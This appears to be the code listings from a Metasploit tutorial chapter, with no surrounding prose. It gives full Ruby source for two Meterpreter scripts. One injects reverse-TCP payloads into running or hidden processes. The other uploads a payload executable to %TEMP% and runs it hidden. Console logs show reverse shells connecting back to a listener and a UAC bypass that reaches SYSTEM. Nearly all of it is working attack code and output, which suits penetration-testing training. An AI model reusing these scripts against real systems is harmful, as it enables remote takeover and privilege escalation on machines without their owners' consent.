["```\nmeterpreter > `run multi_meter_inject -h`\nMeterpreter script for injecting a reverse tcp Meterpreter\n payload into memory space of\nmultiple PID's. If none is provided, notepad.exe will be spawned and the meterpreter\npayload injected into it.\n\nOPTIONS:\n\n    -h           Help menu.\n    -m         Start Exploit multi/handler for return connection\n    -mp <opt>\n  Provide Multiple PID for connections separated by comma one per IP.\n    -mr <opt>\n  Provide Multiple IP Addresses for Connections separated by comma.\n    -p  <opt>  The\n port on the remote host where Metasploit is listening (default: 4444)\n    -pt   <opt>  Specify Reverse Connection Meterpreter Payload. Default windows/\n                     meterpreter/reverse_tcp\n\nmeterpreter >\n```", "```\nmeterpreter > `ps`\n\nProcess list\n============\n\n PID   Name                 Arch  Session  User                  Path\n ---   ----                 ----  -------  ----                  ----\n 0     [System Process]\n 4     System\n 256   smss.exe\n 364   csrss.exe\n 412   wininit.exe\n 424   csrss.exe\n 472   winlogon.exe\n 516   services.exe\n 524   lsass.exe\n 532   lsm.exe\n 2808  iexplorer.exe      x86\nmeterpreter >\n```", "```\nmeterpreter > `run multi_meter_inject -mp 2808 -mr 172.16.32.129 -p 443`\n  [*] Creating a reverse meterpreter stager: LHOST=172.16.32.129 LPORT=443\n  [*] Injecting meterpreter into process ID 2808\n  [*] Allocated memory at address 0x03180000, for 290 byte stager\n  [*] Writing the stager into memory...\n  [*] Sending stage (749056 bytes) to 172.16.32.170\n  [+] Successfully injected Meterpreter in to process: 2808\n [*] Meterpreter session 3 opened (172.16.32.129:443 -> 172.16.32.170:1098) at\n      Tue Nov 30 22:37:29 −0500 2010\n  meterpreter >\n```", "```\n# $Id: multi_meter_inject.rb 10901 2010-11-04 18:42:36Z darkoperator $\n  # $Revision: 10901 $\n  # Author: Carlos Perez at carlos_perez[at]darkoperator.com\n  #-----------------------------------------------------------------------------\n  ################## Variable Declarations ##################\n\n  @client  = client\n  lhost    = Rex::Socket.source_address(\"1.2.3.4\")\n  lport    = 4444\n  lhost    = \"127.0.0.1\"\n pid = nil\n  multi_ip = nil\n  multi_pid = []\n  payload_type = \"windows/meterpreter/reverse_tcp\"\n  start_handler = nil\n @exec_opts = Rex::Parser::Arguments.new(\n          \"-h\"  => [ false,  \"Help menu.\" ],\n          \"-p\"  => [ true,   \"The port on the remote host where\n Metasploit is              listening (default: 4444)\"],\n          \"-m\"  => [ false,  \"Start Exploit multi/handler for return connection\"],\n          \"-pt\" => [ true,   \"Specify Reverse Connection\n Meterpreter Payload.              Default windows/meterpreter/reverse_tcp\"],\n          \"-mr\" => [ true,   \"Provide Multiple IP Addresses\n for Connections              separated by comma.\"],\n          \"-mp\" => [ true,   \"Provide Multiple PID for connections\n separated by              comma one per IP.\"]\n  )\n  meter_type = client.platform\n```", "```\n################## Function Declarations ##################\n\n  # Usage Message Function\n  #-------------------------------------------------------------------------------\n def usage\n          print_line \"Meterpreter Script for injecting a reverse\n tcp Meterpreter Payload\"\n          print_line \"in to memory of multiple PID's, if none is\n provided a notepad process.\"\n          print_line \"will be created and a Meterpreter Payload\n will be injected in to each.\"\n          print_line(@exec_opts.usage)\n          raise Rex::Script::Completed\n  end\n\n  # Wrong Meterpreter Version Message Function\n  #-------------------------------------------------------------------------------\n  def wrong_meter_version(meter = meter_type)\n          print_error(\"#{meter} version of Meterpreter is not\n supported with this Script!\")\n          raise Rex::Script::Completed\n  end\n\n  # Function for injecting payload in to a given PID\n  #-------------------------------------------------------------------------------\n def inject(target_pid, payload_to_inject)\n          print_status(\"Injecting meterpreter into process ID #{target_pid}\")\n          begin\n                  host_process = @client.sys.process.open\n(target_pid.to_i, PROCESS_ALL_ACCESS)\n                  raw = payload_to_inject.generate\n\nmem = host_process.memory.allocate(raw.length + (raw.length % 1024))\n\n                  print_status(\"Allocated memory at\n address #{\"0x%.8x\" % mem}, for                       #{raw.length} byte stager\")\n                  print_status(\"Writing the stager into memory...\")\n                host_process.memory.write(mem, raw)\n                host_process.thread.create(mem, 0)\n                  print_good(\"Successfully injected Meterpreter\n in to process: #{target_pid}\")\n          rescue::Exception => e\n                  print_error(\"Failed to Inject Payload to #{target_pid}!\")\n                  print_error(e)\n          end\n  end\n```", "```\n# Function for creation of connection handler\n#-------------------------------------------------------------------------------\n`def create_multi_handler(payload_to_inject)`\n        mul = @client.framework.exploits.create(\"multi/handler\")\n        mul.share_datastore(payload_to_inject.datastore)\n        mul.datastore['WORKSPACE'] = @client.workspace\n        mul.datastore['PAYLOAD'] = payload_to_inject\n        mul.datastore['EXITFUNC'] = 'process'\n        mul.datastore['ExitOnSession'] = true\n        print_status(\"Running payload handler\")\n        mul.exploit_simple(\n                'Payload'  => mul.datastore['PAYLOAD'],\n                'RunAsJob' => true\n        )\n\nend\n```", "```\n# Function for Creating the Payload\n#-------------------------------------------------------------------------------\ndef create_payload(payload_type,lhost,lport)\n        print_status(\"Creating a reverse meterpreter\n stager: LHOST=#{lhost} LPORT=#{lport}\")\n        payload = payload_type\n        `pay = client.framework.payloads.create(payload)`\n        pay.datastore['LHOST'] = lhost\n        pay.datastore['LPORT'] = lport\n        return pay\nend\n```", "```\n# Function that starts the notepad.exe process\n#-------------------------------------------------------------------------------\ndef start_proc()\n        print_good(\"Starting Notepad.exe to house Meterpreter Session.\")\n        `proc = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })`\n        print_good(\"Process created with pid #{proc.pid}\")\n        return proc.pid\nend\n```", "```\n################## Main ##################\n@exec_opts.parse(args) { |opt, idx, val|\n        case opt\n        when \"-h\"\n                usage\n        when \"-p\"\n                lport = val.to_i\n        when \"-m\"\n                start_handler = true\n        when \"-pt\"\n                payload_type = val\n        when \"-mr\"\n                multi_ip = val.split(\",\")\n        when \"-mp\"\n                multi_pid = val.split(\",\")\n        end\n}\n\n# Check for Version of Meterpreter\nwrong_meter_version(meter_type) if meter_type !˜ /win32|win64/i\n# Create a Multi Handler is Desired\ncreate_multi_handler(payload_type) if start_handler\n```", "```\n# Check for a PID or program name\n\nif multi_ip\n        if multi_pid\n                if multi_ip.length == multi_pid.length\n                        pid_index = 0\n                        multi_ip.each do |i|\n                                payload = create_payload(payload_type,i,lport)\n                                inject(multi_pid[pid_index],payload)\n                                select(nil, nil, nil, 5)\n                                pid_index = pid_index + 1\n                        end\n                else\n                        multi_ip.each do |i|\n                                payload = create_payload(payload_type,i,lport)\n                                inject(start_proc,payload)\n                                select(nil, nil, nil, 2)\n                        end\n                end\n        end\nelse\n        print_error(\"You must provide at least one IP!\")\nend\n```", "```\nmeterpreter > `irb`\n[*] Starting IRB shell\n[*] The 'client' variable holds the meterpreter client\n>>\n```", "```\n>> `print_line(\"you have been pwnd!\")`\nyou have been pwnd!\n=> nil\n```", "```\n>> `print_status(\"you have been pwnd!\")`\n[*] you have been pwnd!\n=> nil\n```", "```\n>> `print_good(\"you have been pwnd\")`\n[+] you have been pwnd\n=> nil\n```", "```\n>> `print_error(\"you have been pwnd!\")`\n[-] you have been pwnd!\n=> nil\n```", "```\nroot@bt:˜# `ls -F /opt/framework3/`\n`msf3/lib/rex/post/meterpreter/ui/console/command_dispatcher/`\n\ncore.rb  espia.rb  incognito.rb  networkpug.rb  priv/\n  priv.rb  sniffer.rb  stdapi/  stdapi.rb\n```", "```\n# Meterpreter script for uploading and executing another meterpreter exe\n\ninfo = \"Simple script for uploading and executing an additional meterpreter payload\"\n\n# Options\n\nopts = Rex::Parser::Arguments.new(\n        \"-h\"  => [ false,\n   \"This help menu. Spawn a meterpreter shell by\n uploading and               executing.\"],\n        \"-r\"  => [ true,\n    \"The IP of a remote Metasploit listening for the connect back\"],\n        \"-p\"  => [ true,    \"The port\n on the remote host where Metasploit is listening               (default: 4444)\"]\n)\n```", "```\nfilename= Rex::Text.rand_text_alpha((rand(8)+6)) + \".exe\"\nrhost    = Rex::Socket.source_address(\"1.2.3.4\")\nrport    = 4444\nlhost    = \"127.0.0.1\"\npay      = nil\n\n#\n# Option parsing\n#\nopts.parse(args) do |opt, idx, val|\n        case opt\n        when \"-h\"\n                print_line(info)\n                print_line(opts.usage)\n                raise Rex::Script::Completed\n\n        when \"-r\"\n                rhost = val\n        when \"-p\"\n                rport = val.to_i\n\n        end\n\nend\n```", "```\n payload = \"windows/meterpreter/reverse_tcp\"\n pay = client.framework.payloads.create(payload)\n  pay.datastore['LHOST'] = rhost\n  pay.datastore['LPORT'] = rport\n  mul = client.framework.exploits.create(\"multi/handler\")\n  mul.share_datastore(pay.datastore)\n  mul.datastore['WORKSPACE'] = client.workspace\n  mul.datastore['PAYLOAD'] = payload\n  mul.datastore['EXITFUNC'] = 'process'\n  mul.datastore['ExitOnSession'] = true\n  mul.exploit_simple(\n  'Payload'  => mul.datastore['PAYLOAD'],\n  'RunAsJob' => true\n   )\n```", "```\n if client.platform =˜ /win32|win64/\n\n        tempdir = client.fs.file.expand_path(\"%TEMP%\")\n          print_status(\"Uploading meterpreter to temp directory...\")\n          raw = pay.generate\n        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)\n          tempexe = tempdir + \"\\\\\" + filename\n          tempexe.gsub!(\"\\\\\\\\\", \"\\\\\")\n          fd = client.fs.file.new(tempexe, \"wb\")\n          fd.write(exe)\n          fd.close\n          print_status(\"Executing the payload on the system...\")\n          execute_payload = \"#{tempdir}\\\\#{filename}\"\n         pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})\n\n  end\n```", "```\n# Meterpreter script for uploading and executing another meterpreter exe\n\ninfo = \"Simple script for uploading and executing an additional meterpreter payload\"\n\n#\n# Options\n#\n\nopts = Rex::Parser::Arguments.new(\n       \"-h\"  => [ false,   \"This help menu. Spawn a\n meterpreter shell by uploading and             executing.\"],\n       \"-r\"  => [ true,    \"The IP of a remote Metasploit\n listening for the connect back\"],\n       \"-p\"  => [ true,    \"The port on the remote host where\n Metasploit is listening             (default: 4444)\"]\n)\n\n#\n# Default parameters\n#\n\nfilename = Rex::Text.rand_text_alpha((rand(8)+6)) + \".exe\"\nrhost    = Rex::Socket.source_address(\"1.2.3.4\")\nrport    = 4444\nlhost    = \"127.0.0.1\"\npay      = nil\n\n#\n# Option parsing\n#\n\nopts.parse(args) do |opt, idx, val|\n       case opt\n       when \"-h\"\n              print_line(info)\n              print_line(opts.usage)\n              raise Rex::Script::Completed\n\n       when \"-r\"\n              rhost = val\n       when \"-p\"\n              rport = val.to_i\n\n       end\n\nend\n\n       payload = \"windows/meterpreter/reverse_tcp\"\n       pay = client.framework.payloads.create(payload)\n       pay.datastore['LHOST'] = rhost\n       pay.datastore['LPORT'] = rport\n       mul = client.framework.exploits.create(\"multi/handler\")\n       mul.share_datastore(pay.datastore)\n       mul.datastore['WORKSPACE'] = client.workspace\n       mul.datastore['PAYLOAD'] = payload\n       mul.datastore['EXITFUNC'] = 'process'\n       mul.datastore['ExitOnSession'] = true\n       print_status(\"Running payload handler\")\n       mul.exploit_simple(\n              'Payload'  => mul.datastore['PAYLOAD'],\n              'RunAsJob' => true\n       )\n\nif client.platform =˜ /win32|win64/\n\n       tempdir = client.fs.file.expand_path(\"%TEMP%\")\n       print_status(\"Uploading meterpreter to temp directory\")\n        raw = pay.generate\n        exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)\n       tempexe = tempdir + \"\\\\\" + filename\n        tempexe.gsub!(\"\\\\\\\\\", \"\\\\\")\n       fd = client.fs.file.new(tempexe, \"wb\")\n       fd.write(exe)\n       fd.close\n       print_status(\"Executing the payload on the system\")\n       execute_payload = \"#{tempdir}\\\\#{filename}\"\n       pid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})\n\nend\n```", "```\nmeterpreter > `run execute_upload -r 172.16.32.129 -p 443`\n[*] Running payload handler\n[*] Uploading meterpreter to temp directory\n[*] Executing the payload on the system\n[*] Sending stage (749056 bytes) to 172.16.32.170\n[*] Meterpreter session 2 opened (172.16.32.129:443 -> 172.16.32.170:1140) at\n      Tue Nov 30 23:24:19 −0500 2010\nmeterpreter >\n```", "```\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\nmsf exploit(handler) >\n[*] Started reverse handler on 0.0.0.0:443\n[*] Starting the payload handler...\n[*] Sending stage (749056 bytes) to 172.16.32.130\n[*] Meterpreter session 1 opened (172.16.32.128:443 ->\n 172.16.32.130:2310) at      Thu June 09 08:02:45 −0500 2011\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied.\nmeterpreter > sysinfo\nComputer: DAVE-DEV-PC\nOS      : Windows 7 (Build 7600).\nArch    : x64 (Current Process is WOW64)\nLanguage: en_US\nmeterpreter >\n```", "```\nmsf exploit(handler) > `use post/windows/escalate/bypassuac`\nmsf post(bypassuac) > `show options`\nModule options (post/windows/escalate/bypassuac):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   LHOST                     no        Listener IP address for the new session\n   LPORT    4444             no        Listener port for the new session\n   SESSION                   yes       The session to run this module on.\n\nmsf post(bypassuac) > `set LHOST 172.16.32.128`\nLHOST => 172.16.32.128\nmsf post(bypassuac) > `set SESSION 1`\nSESSION => 1\nmsf post(bypassuac) > `exploit`\n\n[*] Started reverse handler on 172.16.32.128:4444\n[*] Starting the payload handler...\n[*] Uploading the bypass UAC executable to the filesystem...\n[*] Meterpreter stager executable 73802 bytes long being uploaded..\n[*] Uploaded the agent to the filesystem....\n[*] Post module execution completed\nmsf post(bypassuac) >\n[*] Sending stage (749056 bytes) to 172.16.32.130\n[*] Meterpreter session 2 opened (172.16.32.128:4444 ->\n 172.16.32.130:1106) at Thu June 09\n     19:50:54 −0500 2011\n[*] Session ID 2 (172.16.32.128:4444 -> 172.16.32.130:1106)\n processing InitialAutoRunScript\n     'migrate -f'\n[*] Current server process: tYNpQMP.exe (3716)\n[*] Spawning a notepad.exe host process...\n[*] Migrating into process ID 3812\n[*] New server process: notepad.exe (3812)\n\nmsf post(bypassuac) > `sessions -i 2`\n[*] Starting interaction with 2...\n\nmeterpreter > `getsystem`\n...got system (via technique 1).\nmeterpreter >\n```", "```\nroot@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb\n```"]